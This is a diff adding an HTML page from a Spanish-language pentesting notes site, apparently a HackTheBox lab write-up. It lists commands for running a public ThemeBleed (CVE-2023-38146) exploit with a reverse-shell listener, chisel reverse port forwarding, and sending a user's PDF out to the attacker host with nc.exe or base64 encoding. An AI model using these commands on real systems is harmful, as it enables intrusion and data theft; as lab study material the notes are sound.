@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/Jnnshschl/CVE-2023-38146.git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/Jnnshschl/CVE-2023-38146.git
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 themebleed.py <span class="nt">-r</span> 10.10.14.3 <span class="nt">-p</span> 4444
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chisel server <span class="nt">--port</span> 7777 <span class="nt">--reverse</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\c</span>hisel.exe client 10.10.14.3:7777 R:135:127.0.0.1:135 R:445:127.0.0.1:445 R:5040:127.0.0.1:5040 R:139:127.0.0.1:139 R:5000:127.0.0.1:5000
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd /c <span class="s2">"nc.exe 10.10.14.3 443 &lt; C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\s</span><span class="s2">am.emerson</span><span class="se">\D</span><span class="s2">ocuments</span><span class="se">\C</span><span class="s2">VE-2023-28252_Summary.pdf"</span>
+
+nc <span class="nt">-lp</span> 443 <span class="o">&gt;</span> file.pdf
+</code></pre></div></div>
+
+<p>Mejor forma:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="s2">"CVE-2023-28252_Summary.pdf"</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">byte</span><span class="p">))</span><span class="w">
+</span></code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
